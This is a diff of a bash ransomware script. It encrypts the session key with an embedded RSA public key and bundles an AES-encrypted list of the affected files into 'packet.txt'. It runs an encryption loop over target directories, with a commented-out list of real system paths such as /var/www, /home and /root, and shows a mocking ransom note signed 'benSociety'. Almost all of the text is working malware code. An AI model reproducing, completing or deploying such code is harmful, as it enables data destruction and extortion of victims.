@@ -79,9 +79,10 @@ vjrvvf9kQCMyvV+xb0m6I+Omwixyh6MEVy323GTGcDvvILRWrne40yzf3O0Xk8Ty
 nwIDAQAB
 -----END PUBLIC KEY-----\
 	"
-	echo "$pubkey" > vmware.pub
-	PRIVATEKEY="vmware.key"
-	echo "$KEY" | openssl rsautl -encrypt -pubin -inkey "vmware.pub" -out $PRIVATEKEY
+	PUBLICKEY="publickey.txt"
+	PRIVATEKEY="packet.txt"
+	echo "$pubkey" > $PUBLICKEY
+	echo "$KEY" | openssl rsautl -encrypt -pubin -inkey "$PUBLICKEY" | openssl base64 -out $PRIVATEKEY
 }
 navdir() {
 for fil in $1; do
@@ -160,7 +161,8 @@ main() {
     targets="/root/Desktop/testing"
     #targets="/var/spool /var/named /etc/mail /etc/postfix /var/www /root /home /var/lib/mysql"
     enc_loop "$targets"
-    printf "$LIST" > TARGETS.TXT
+    echo >> $PRIVATEKEY
+    printf "$LIST" | openssl aes-256-cbc -k "$KEY" | openssl base64 >> $PRIVATEKEY
     message="Congratulations,\n\nYou have been infected with a RANSOMWARE!!!!!\nI know. Scary stuff.\nAnyways, Come talk to us about getting some of those super important files back.. Or not.. Your choice kid.\n\nLove,\n\n~benSociety"
     title="Oops.."
     showmess "$title" "$message"
